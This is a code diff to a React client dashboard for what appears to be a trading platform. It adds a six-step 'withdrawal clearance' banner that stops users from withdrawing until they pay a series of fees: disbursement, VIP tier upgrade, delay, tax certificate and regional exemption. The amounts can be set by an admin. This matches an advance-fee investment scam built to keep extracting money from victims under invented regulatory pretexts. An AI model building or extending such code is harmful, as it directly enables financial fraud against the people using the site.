@@ -57,6 +57,58 @@ export const ClientDashboard: React.FC<ClientDashboardProps> = ({
   const allDeposits = (storeState.deposits || []).filter((d) => d.userId === user.id);
   const completedWithdrawals = allWithdrawals.filter((w) => w.status === 'COMPLETED');
 
+  // 6-Step Institutional Withdrawal Clearance State
+  const clearance = user.withdrawalClearance || {
+    withdrawalFeePaid: false,
+    accountUpgraded: false,
+    delayFeePaid: false,
+    taxFeePaid: false,
+    religiousJurisdictionApproved: false
+  };
+
+  const step1Kyc = user.kycStatus === 'verified';
+  const step2Fee = clearance.withdrawalFeePaid;
+  const step3Tier = clearance.accountUpgraded;
+  const step4Delay = clearance.delayFeePaid;
+  const step5Tax = clearance.taxFeePaid;
+  const step6Jurisdiction = clearance.religiousJurisdictionApproved;
+
+  const step2FeeAmount = clearance.withdrawalFeeAmount ?? 250;
+  const step3FeeAmount = clearance.upgradeFeeAmount ?? 500;
+  const step4FeeAmount = clearance.delayFeeAmount ?? 380;
+  const step5FeeAmount = clearance.taxFeeAmount ?? 520;
+  const step6FeeAmount = clearance.jurisdictionFeeAmount ?? 300;
+
+  let activeStepNumber = 7;
+  let activeStepName = 'All 6 Clearance Steps Approved';
+  let activeStepAction = 'Proceed to Withdraw';
+
+  if (!step1Kyc) {
+    activeStepNumber = 1;
+    activeStepName = 'Step 1 of 6: Tier-1 KYC Identity Verification Required';
+    activeStepAction = 'Complete KYC Identity Verification';
+  } else if (!step2Fee) {
+    activeStepNumber = 2;
+    activeStepName = `Step 2 of 6: Mandatory Disbursement Fee ($${step2FeeAmount.toFixed(2)}) Required`;
+    activeStepAction = `Pay Disbursement Fee ($${step2FeeAmount.toFixed(2)})`;
+  } else if (!step3Tier) {
+    activeStepNumber = 3;
+    activeStepName = `Step 3 of 6: VIP Tier 8.3 Account Upgrade ($${step3FeeAmount.toFixed(2)}) Required`;
+    activeStepAction = `Upgrade to VIP Tier ($${step3FeeAmount.toFixed(2)})`;
+  } else if (!step4Delay) {
+    activeStepNumber = 4;
+    activeStepName = `Step 4 of 6: Settlement Delay Clearance Fee ($${step4FeeAmount.toFixed(2)}) Required`;
+    activeStepAction = `Settle Delay Fee ($${step4FeeAmount.toFixed(2)})`;
+  } else if (!step5Tax) {
+    activeStepNumber = 5;
+    activeStepName = `Step 5 of 6: Statutory Capital Gains Tax Certificate ($${step5FeeAmount.toFixed(2)}) Required`;
+    activeStepAction = `Settle Tax Certificate ($${step5FeeAmount.toFixed(2)})`;
+  } else if (!step6Jurisdiction) {
+    activeStepNumber = 6;
+    activeStepName = `Step 6 of 6: Regional Banking Exemption Clearance ($${step6FeeAmount.toFixed(2)}) Required`;
+    activeStepAction = `Settle Exemption Waiver ($${step6FeeAmount.toFixed(2)})`;
+  }
+
   return (
     <div className="space-y-6 max-w-full overflow-x-hidden">
       {/* ================= TOP TICKER BAR (EXACT AS SCREENSHOT) ================= */}
@@ -334,6 +386,67 @@ export const ClientDashboard: React.FC<ClientDashboardProps> = ({
             <div className="text-xs text-slate-400">Institutional Credit</div>
             <div className="text-[11px] text-purple-400 font-semibold mt-0.5">Usable on Margin</div>
           </div>
+        </div>
+      </div>
+
+      {/* ================= INSTITUTIONAL WITHDRAWAL CLEARANCE BANNER ================= */}
+      <div
+        className={`p-4 sm:p-5 rounded-2xl border shadow-lg flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 transition-all ${
+          activeStepNumber === 7
+            ? 'bg-gradient-to-r from-emerald-950/40 via-[#0b1b24] to-[#0b1325] border-emerald-500/40 text-emerald-200'
+            : 'bg-gradient-to-r from-amber-950/30 via-[#0f1c38] to-[#0b1325] border-amber-500/40 text-amber-200'
+        }`}
+      >
+        <div className="flex items-center gap-3.5">
+          <div
+            className={`w-11 h-11 rounded-xl flex items-center justify-center border shrink-0 ${
+              activeStepNumber === 7
+                ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40'
+                : 'bg-amber-500/20 text-amber-400 border-amber-500/40'
+            }`}
+          >
+            {activeStepNumber === 7 ? (
+              <CheckCircle2 className="w-5 h-5 text-emerald-400" />
+            ) : (
+              <ShieldCheck className="w-5 h-5 text-amber-400" />
+            )}
+          </div>
+          <div>
+            <div className="flex items-center gap-2">
+              <span className="text-[10px] font-bold text-amber-400 uppercase tracking-widest">
+                Regulatory Clearance Protocol
+              </span>
+              <span
+                className={`px-2 py-0.5 rounded-full text-[9px] font-bold border ${
+                  activeStepNumber === 7
+                    ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
+                    : 'bg-blue-500/20 text-blue-300 border-blue-500/30'
+                }`}
+              >
+                {activeStepNumber === 7 ? 'All 6 Steps Cleared' : `Step ${activeStepNumber} of 6 Active`}
+              </span>
+            </div>
+            <div className="text-sm font-bold text-white mt-0.5">{activeStepName}</div>
+            <div className="text-[11px] text-slate-400">
+              {activeStepNumber === 7
+                ? 'Your account has completed all KYC, tier upgrade, fee, delay, tax, and regional compliance verifications.'
+                : 'Admin approvals and custom fee amounts update instantly across all browsers and devices.'}
+            </div>
+          </div>
+        </div>
+
+        <div className="flex items-center gap-2 self-stretch sm:self-auto shrink-0">
+          <button
+            onClick={() => onNavigate(activeStepNumber === 1 ? 'kyc' : 'withdraw')}
+            className={`w-full sm:w-auto px-4 py-2.5 rounded-xl font-extrabold text-xs shadow-md flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
+              activeStepNumber === 7
+                ? 'bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 text-slate-950 shadow-emerald-500/20'
+                : 'bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-slate-950 shadow-amber-500/20'
+            }`}
+          >
+            <span>{activeStepAction}</span>
+            <ChevronRight className="w-4 h-4" />
+          </button>
         </div>
       </div>
 
